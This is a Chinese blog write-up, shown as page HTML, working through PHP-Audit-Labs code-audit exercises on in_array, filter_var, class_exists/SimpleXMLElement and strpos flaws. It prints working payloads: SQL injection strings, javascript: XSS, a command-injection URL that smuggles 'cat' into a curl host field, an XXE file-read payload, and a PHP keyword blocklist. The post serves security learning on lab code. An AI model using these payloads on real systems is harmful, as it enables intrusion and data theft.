@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#@byc_404'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>PHP-Audit-Labs审计学习 - byc_404&#39;s blog</title>
+  
+    <meta name="keywords" content="WEB,PHP">
+  
+  
+    <meta name="description" content="打算在代码审计上入下坑。本来找了个不知名cms想审计一下的。偶然间看到了星盟王叹之师傅在用php-audit-labs练审计,所以自己也打算练一下审计的技术,毕竟自己审计功力太差了…p牛也曾经说过,练习审计到能看懂一个完整的CMS就算有一定功底了。所以就把php-audit-labs的全部都过一遍吧。
+(最近也总...">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div class="cover-wrapper">
+    
+      <cover class='cover post half'>
+        <div class='cover-body'>
+  <div class='a'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='b'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <ul class='cover-list-h'>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+      </cover>
+    
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+  </div>
+
+
+  <div class="l_body">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/">
+      PHP-Audit-Labs审计学习
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://www.bycsec.top" rel="nofollow">
+    <img src="/assests/favicon.ico">
+    <p>byc_404</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 27, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p>打算在代码审计上入下坑。本来找了个不知名cms想审计一下的。偶然间看到了星盟王叹之师傅在用php-audit-labs练审计,所以自己也打算练一下审计的技术,毕竟自己审计功力太差了…p牛也曾经说过,练习审计到能看懂一个完整的CMS就算有一定功底了。所以就把php-audit-labs的全部都过一遍吧。</p>
+<p>(最近也总算熟练了一下node跟python相关的开发入门。等之后找时间把java入门知识过一遍,再把ECMAscript6的基础过一遍就差不多了）</p>
+<a id="more"></a>
+
+<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/1.png" alt><br>任意文件上传漏洞。主要问题在于<code>in_array()</code>函数的使用不当。如果未设置<code>in_array()</code>第三个参数为true则我们可以通过上传<code>7shell.php</code>绕过检查。因为<code>7shell.php</code>被转换为7.<br>同样出现在某cms中利用这点可以绕过进行insert_into注入<br><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/2.png" alt><br>当in_array()绕过后轻松达成注入。<br><code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code></p>
+<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">    $back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">    <span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">'COUNT(*)'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE id=$id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"id $id is not in whitelist."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这题的<code>in_array()</code>并不是难点。因为只要id开头为数字就能绕过了<br>主要问题在于后面注入上。<br>所幸语句中会爆出sqlerror.在过滤了这些关键字的情况下仍可以使用报错函数,select,from等基本就足够得到flag了。<br>不过这里存在一个细节,就是updatexml这样的报错函数如果语句中不包含特殊字符也就是我们原来经常使用的0x7e之类的字符，爆出的结果将会出现字符丢失的现象。</p>
+<p>所以找替代的字符串连接函数即可.<code>make_set()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure>
+
+<p>其实自己原来做sql注入的题目也曾搜索过相关的内容。比如在concat被过滤的情况下不使用<code>group_concat</code>将所有查询结果都列出来。当时发现<code>make_set()</code>是能起到concat一样的效果的。但是注意的是,<code>make_set</code>至少接收两个参数,因此必须使用逗号。<code>concat</code>类则不然。</p>
+<h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/3.png" alt></p>
+<p>题目主要是在两处存在过滤。首先是twig模板里出现的link被escape了</p>
+<p>然后是一个filter_var()函数<br>这里escape过滤器调用的实际上是<code>htmlspecialchars()</code>函数。作用自然是将常见的特殊字符转为实体字符。<br>而<code>filter_var()</code>在curl的ssrf中就曾见过。主要检查一个url是否合法。<br>因此代码逻辑主要是经过过滤后生成一个a标签。<br>那么可能存在self-xss</p>
+<p>官方的payload<br><code>?nextSlide=javascript://comment％250aalert(1)</code>达到弹窗的self-xss. 使用javascript伪协议绕过<br>巧妙的就是利用filtervar的缺陷轻松使用xxx://的形式绕过检查。然后也可以进行js语句的执行。重要的一点就是//在js中是注释符。因此使用%250a(double urlencode %0a 以绕过浏览器自动的解码)将后面的内容换行到下一行。成功执行alert.</p>
+<p>某cms中的利用是,在访问404页面存在这样的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span>&lt;/code&gt;</span><br></pre></td></tr></table></figure>
+<p>current_url()方法接受完整的404url参数。返回最后一个/后的内容拼接进code代码块。即可以插入xss代码<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>导致了xss<br>payload<code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p>
+<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一个明显的curl。而且还是经典的可绕过的<code>filter_var()</code>+<code>parse_url()</code>+<code>exec()</code>执行curl的配置。<br>那现在关键是利用这个来进行文件读取。<br>比如把之前的可绕过<code>filter_var()</code>+<code>parse_url()</code>的payload拿出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">demo:&#x2F;&#x2F;evil.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">demo:&#x2F;&#x2F;evil.com:80,sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
+<p>这里想要执行命令读取文件。那么恰好可以用到linux中使用分号进行命令分割的作用。<br><code>demo://%22;ls;%23;sec-redclub.com:80/</code><br>然后为了读文件使用<code>&lt;</code>代替空格<br><code>demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code></p>
+<p>单纯针对filter_var的话把七月火师傅的payload放出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="class-exists-amp-amp-内部类xxe"><a href="#class-exists-amp-amp-内部类xxe" class="headerlink" title="class_exists()&amp;&amp;内部类xxe"></a>class_exists()&amp;&amp;内部类xxe</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/4.png" alt></p>
+<p>上面的代码有一个比较过时的路径穿越的文件包含的洞。<br>即调用<code>class_exists()</code>函数时会自动加载__autoload()。达成文件包含。如果是ph5-5.3则可以构造路径穿越。<br>还有一个洞比较有意思。实例化类的类名和传入类的参数均可控。此时即使没有恶意类我们也能用SimpleXMLElement构造xxe攻击。这点我在buu上做<br>SUCTF 2018 Homework这题时也用到了它达成xxe并进一步使用xxe打ssrf</p>
+<p>某cms的利用是一个可控变量带来的反序列化XXE.具体利用不谈。简单说下gadget最后的利用。类中实现了一个反射类实例化。而类名可控。之后连反射类的参数也是可控的。导致我们可以任意实例化SimpleXMLElement并构造xxepayload进行攻击。<br>根据实际情况构造payload<br><code>{&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}</code><br>这里几个参数尤其是2那个印象很深刻,同时也很必要。SUCTF那题就是如此<br><code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code></p>
+<h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'404'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? $_GET[<span class="string">'name'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]) ? $_GET[<span class="string">'param'</span>] : <span class="keyword">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]) ? $_GET[<span class="string">'param2'</span>] : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">    $newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">'=&gt;'</span>.$value.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用经过上面的铺垫就很简单了。直接用可控的参数进行xxe即可。但是需要注意的是,xxe需要进行php文件流来进行内容读取。因为<code>&lt; &gt; &amp; &#39; &quot;</code>等字符会使xml解析出错。不过用base64读文件这种解决办法想必早就是轻车熟路了吧。<br><code>?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</code></p>
+<p>假如题目不知道flag的名字还可以用另外的类进行文件名的读取。<br><code>?name=GlobIterator&amp;param=./*.php&amp;param2=0</code><br>作用与glob差不多。</p>
+<h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="str-pos-错误使用"><a href="#str-pos-错误使用" class="headerlink" title="str_pos()错误使用"></a>str_pos()错误使用</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/5.png" alt></p>
+<p>php许多函数因为弱类型或黑魔法诞生了各种各样的漏洞。str_pos()也是如此。上面的代码看似严格限制了内容不能含有<code>&lt;</code>与<code>&gt;</code>。然而str_pos返回的值可以是0.<br>即匹配的字符串首个字符就是<code>&lt;</code>，<code>&gt;</code>。既然如此，<code>！strpos()</code>返回的就是真值。成功绕过。<br>payload:<br><code>&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code><br>同样类似的漏洞也常见于preg_match()这样的函数。因为它可能会因为传入数组或者正则回溯导致返回false值。如果开发者所写的判断只是<code>!preg_match()</code>就很容易绕过了。</p>
+<p>某CMS中的问题也是弱类型的锅。使用若类型相等判断时，假如数据库中存储的值是空字符串。那么当null与””进行弱类型相等时将返回true.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">null</span>==<span class="string">''</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0.0"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0."</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0e"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><p>这是攻防世界上做过的原题。应该是lottery这个把。用到的是json的弱类型。json弱类型判相等时，只要传入true与非零数字。结果都将返回true</p>
+<p>json弱类型比较出名的一个比较就是数字与字符串之间的转换</p>
